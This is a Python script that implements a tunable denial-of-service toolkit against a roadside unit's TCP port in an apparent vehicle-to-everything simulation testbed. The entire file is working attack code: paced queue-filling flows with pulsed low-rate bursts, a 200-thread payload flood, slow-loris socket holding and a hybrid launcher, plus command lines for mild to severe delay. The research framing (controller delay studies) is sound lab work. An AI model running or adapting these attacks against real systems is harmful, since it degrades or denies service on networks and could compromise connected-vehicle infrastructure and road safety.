#! /usr/bin/env python3
"""
Soft DoS toolkit for RSU port: tunable *delay without cutoffs*

Modes
-----
1) queue  : QueueFiller (persistent TCP flows with rate control; optional pulsing)
2) flood  : Many sender threads repeatedly sending framed payloads
3) loris  : Slow-loris style drip sockets
4) hybrid : Combine any of the above (choose via flags)

Typical use
-----------
- Use `queue` to produce *stable, controllable* one-way delay (best for controller studies).
- Keep flows modest (<=64) to avoid FD exhaustion; adjust --rate-bps and --flows to hit target p95.
- Optionally enable pulsing for realistic jitter (LDDoS/Shrew-style on/off bursts).

Examples
--------
Queue filler, ~mild delay:
  python3 attack_soft_DoS.py --mode queue --flows 16 --rate-bps 75000 --duration 120

Moderate delay with pulsing:
  python3 attack_soft_DoS.py --mode queue --flows 32 --rate-bps 150000 --pulse --duty 0.8 --period 1.2

Severe (still stable):
  python3 attack_soft_DoS.py --mode queue --flows 48 --rate-bps 250000 --pulse --duty 0.9 --period 1.8

Legacy flood+loris hybrid:
  python3 attack_soft_DoS.py --mode hybrid --num-fast 200 --num-slow 20 --duration 60
"""

import os
import sys
import time
import socket
import struct
import random
import threading
import argparse

# Make sure we can import your RSU target constants
# (adjust this sys.path if your repo layout differs)
sys.path.append(os.path.abspath("/home/cra/sumo_ws/sumo_cra_traffic_sim/scripts"))
from x2v_constants import SERVER_IP as TARGET_IP
from x2v_constants import SERVER_PORT as TARGET_PORT
from x2v_constants import INTERFACE_SCOPE_ID

# -----------------------------------------------------------------------------
# Shared stop flag for graceful shutdown
# -----------------------------------------------------------------------------
_STOP = threading.Event()

def _sleep_until_end(duration_s: float):
    start = time.time()
    try:
        while not _STOP.is_set():
            if duration_s > 0 and (time.time() - start) >= duration_s:
                break
            time.sleep(0.25)
    except KeyboardInterrupt:
        pass
    finally:
        _STOP.set()

# -----------------------------------------------------------------------------
# Mode A: QueueFiller (tunable queueing delay via CBR/pulsed cross-traffic)
# -----------------------------------------------------------------------------
class QueueFiller(threading.Thread):
    """
    Persistent TCP connection that sends at a controlled rate to build/hold queue
    occupancy in RSU kernel/NIC buffers -> induces *delay* without tearing down
    legit sockets.

    rate_bps applies to *bytes per second on this single connection*.
    If pulse=True, on/off bursts with (duty, period_s) create jittery delay.
    """
    def __init__(self,
                 host: str,
                 port: int,
                 rate_bps: int,
                 payload_bytes: int = 4096,
                 pulse: bool = False,
                 duty: float = 0.7,
                 period_s: float = 1.5,
                 pacing_chunk: int = 1024,
                 scope_id: int = 0):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.scope_id = scope_id
        self.rate_bps = float(rate_bps)
        self.payload_bytes = int(payload_bytes)
        self.pulse = bool(pulse)
        self.duty = float(duty)
        self.period_s = float(period_s)
        self.pacing_chunk = int(pacing_chunk)
        self.sock = None

    def run(self):
        try:

            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            # let Nagle coalesce on attacker sockets for smoother queue build-up
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
            s.settimeout(5.0)
            s.connect((self.host, self.port, 0, self.scope_id))
            s.settimeout(None)                    # <-- IMPORTANT: no send timeout after connect

            self.sock = s
        except Exception as e:
            print(f"[queue] connect error: {e}")
            return

        buf = b"\x00" * self.payload_bytes
        tokens = 0.0
        last = time.perf_counter()

        # pulsing state
        on = True
        if self.pulse:
            pulse_deadline = last + max(0.02, self.duty * self.period_s)
        else:
            pulse_deadline = float("inf")

        try:
            while not _STOP.is_set():
                now = time.perf_counter()
                dt = now - last
                last = now

                # update pulse window
                if self.pulse and now >= pulse_deadline:
                    on = not on
                    dur = (self.duty if on else (1.0 - self.duty)) * self.period_s
                    pulse_deadline = now + max(0.02, dur)

                # token bucket only accrues when 'on'
                if (not self.pulse) or on:
                    tokens += self.rate_bps * dt

                # send in pacing chunks
                while tokens >= self.pacing_chunk and not _STOP.is_set():
                    n = min(self.pacing_chunk, self.payload_bytes)
                    try:
                        self.sock.sendall(buf[:n])
                    except (socket.timeout, BlockingIOError):   # soft back-pressure
                        # let the kernel breathe; keep the flow alive
                        time.sleep(0.01)
                        break
                    except Exception as e:
                        print(f"[queue] send error: {e}")
                        _STOP.set()
                        break
                    tokens -= n

                time.sleep(0.001)
        finally:
            try:
                if self.sock:
                    self.sock.close()
            except Exception:
                pass

def run_queuefiller(flows: int,
                    rate_bps_per_flow: int,
                    pulse: bool,
                    duty: float,
                    period_s: float,
                    pacing_chunk: int,
                    duration: float):
    threads = []
    for _ in range(flows):
        t = QueueFiller(TARGET_IP, TARGET_PORT,
                        rate_bps=rate_bps_per_flow,
                        payload_bytes=4096,
                        pulse=pulse,
                        duty=duty,
                        period_s=period_s,
                        pacing_chunk=pacing_chunk,
                        scope_id=INTERFACE_SCOPE_ID)
        t.start()
        threads.append(t)
        time.sleep(0.01)  # stagger connects

    _sleep_until_end(duration)
    # threads will exit when _STOP is set
    return threads

# -----------------------------------------------------------------------------
# Mode B: Flood (legacy moderate per-thread flooder)
# -----------------------------------------------------------------------------
def _flood_worker(veh_array_size: int, delay_between_sends: float):
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((TARGET_IP, TARGET_PORT, 0, INTERFACE_SCOPE_ID))
    except Exception as e:
        print(f"[flood] connect failed: {e}")
        return

    try:
        while not _STOP.is_set():
            float_values = [random.uniform(0.0, 100.0) for _ in range(veh_array_size)]
            float_values[0] = -1.0  # mark as attack traffic (up to you)
            # keep endianness consistent with your pipeline (little-endian)
            packed = struct.pack(f"<{veh_array_size}f", *float_values)
            try:
                s.sendall(packed)
            except Exception as e:
                print(f"[flood] send error: {e}")
                break

            # a little randomness helps avoid strict phase alignment
            time.sleep(max(0.0, delay_between_sends + random.uniform(0.05, 0.25)))
    finally:
        try:
            s.close()
        except Exception:
            pass

def run_flood(num_fast: int, veh_array_size: int, delay_between_sends: float, duration: float):
    threads = []
    for _ in range(num_fast):
        t = threading.Thread(target=_flood_worker,
                             args=(veh_array_size, delay_between_sends),
                             daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.01)
    _sleep_until_end(duration)
    return threads

# -----------------------------------------------------------------------------
# Mode C: Slow-loris (connection holders; mainly for FD/backlog testing)
# -----------------------------------------------------------------------------
def _loris_worker(interval_lo: float, interval_hi: float):
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((TARGET_IP, TARGET_PORT, 0, INTERFACE_SCOPE_ID))
    except Exception as e:
        print(f"[loris] connect failed: {e}")
        return

    try:
        s.send(b"L")  # keep-alive drip
        while not _STOP.is_set():
            try:
                s.send(b"L")
            except Exception as e:
                print(f"[loris] send error: {e}")
                break
            time.sleep(random.uniform(interval_lo, interval_hi))
    finally:
        try:
            s.close()
        except Exception:
            pass

def run_loris(num_slow: int, interval_lo: float, interval_hi: float, duration: float):
    threads = []
    for _ in range(num_slow):
        t = threading.Thread(target=_loris_worker,
                             args=(interval_lo, interval_hi),
                             daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.03)
    _sleep_until_end(duration)
    return threads

# -----------------------------------------------------------------------------
# Hybrid launcher
# -----------------------------------------------------------------------------
def run_hybrid(num_fast: int,
               loris_count: int,
               flood_delay: float,
               loris_lo: float,
               loris_hi: float,
               duration: float,
               veh_array_size: int = 68):
    threads = []
    # floods
    if num_fast > 0:
        for _ in range(num_fast):
            t = threading.Thread(target=_flood_worker,
                                 args=(veh_array_size, flood_delay),
                                 daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.01)
    # loris
    if loris_count > 0:
        for _ in range(loris_count):
            t = threading.Thread(target=_loris_worker,
                                 args=(loris_lo, loris_hi),
                                 daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.03)

    _sleep_until_end(duration)
    return threads

# -----------------------------------------------------------------------------
# CLI
# -----------------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(description="Soft DoS for inducing controllable delay (RSPC<->RSU<->OBU)")
    p.add_argument("--mode", choices=["queue", "flood", "loris", "hybrid"],
                   default="queue", help="attack mode")
    p.add_argument("--duration", type=float, default=60.0, help="seconds to run (<=0 for until Ctrl-C)")

    # queue params
    p.add_argument("--flows", type=int, default=16, help="queue: number of TCP flows")
    p.add_argument("--rate-bps", type=int, default=150_000, help="queue: bytes/sec per flow")
    p.add_argument("--pulse", action="store_true", help="queue: enable pulsing")
    p.add_argument("--duty", type=float, default=0.8, help="queue: pulse duty cycle")
    p.add_argument("--period", type=float, default=1.2, help="queue: pulse period (sec)")
    p.add_argument("--pacing-chunk", type=int, default=1024, help="queue: pacing write chunk (bytes)")

    # flood params
    p.add_argument("--num-fast", type=int, default=200, help="flood: number of flood threads")
    p.add_argument("--flood-delay", type=float, default=0.05, help="flood: base delay between sends (sec)")
    p.add_argument("--veh-array-size", type=int, default=68, help="flood: floats per message")

    # loris params
    p.add_argument("--num-slow", type=int, default=20, help="loris: number of slow sockets")
    p.add_argument("--loris-interval", type=float, nargs=2, default=[2.0, 5.0],
                   metavar=("LO", "HI"), help="loris: drip interval range (sec)")

    return p.parse_args()

def main():
    args = parse_args()
    print(f"[i] Target RSU: [{TARGET_IP}]:{TARGET_PORT} (scope {INTERFACE_SCOPE_ID})")
    print(f"[i] Mode: {args.mode}; duration={args.duration:.1f}s (Ctrl-C to stop)")

    if args.mode == "queue":
        print(f"[i] QueueFiller: flows={args.flows}, rate_bps/flow={args.rate_bps}, "
              f"pulse={args.pulse}, duty={args.duty}, period={args.period}, "
              f"pacing_chunk={args.pacing_chunk}")
        run_queuefiller(flows=args.flows,
                        rate_bps_per_flow=args.rate_bps,
                        pulse=args.pulse,
                        duty=args.duty,
                        period_s=args.period,
                        pacing_chunk=args.pacing_chunk,
                        duration=args.duration)

    elif args.mode == "flood":
        print(f"[i] Flood: num_fast={args.num_fast}, veh_array_size={args.veh_array_size}, "
              f"delay={args.flood_delay}s")
        run_flood(num_fast=args.num_fast,
                  veh_array_size=args.veh_array_size,
                  delay_between_sends=args.flood_delay,
                  duration=args.duration)

    elif args.mode == "loris":
        print(f"[i] Loris: num_slow={args.num_slow}, interval={tuple(args.loris_interval)}")
        run_loris(num_slow=args.num_slow,
                  interval_lo=float(args.loris_interval[0]),
                  interval_hi=float(args.loris_interval[1]),
                  duration=args.duration)

    elif args.mode == "hybrid":
        print(f"[i] Hybrid: num_fast={args.num_fast}, num_slow={args.num_slow}, "
              f"flood_delay={args.flood_delay}s, loris_interval={tuple(args.loris_interval)}")
        run_hybrid(num_fast=args.num_fast,
                   loris_count=args.num_slow,
                   flood_delay=args.flood_delay,
                   loris_lo=float(args.loris_interval[0]),
                   loris_hi=float(args.loris_interval[1]),
                   duration=args.duration,
                   veh_array_size=args.veh_array_size)

    _STOP.set()
    print("[i] Attack finished.")

if __name__ == "__main__":
    main()
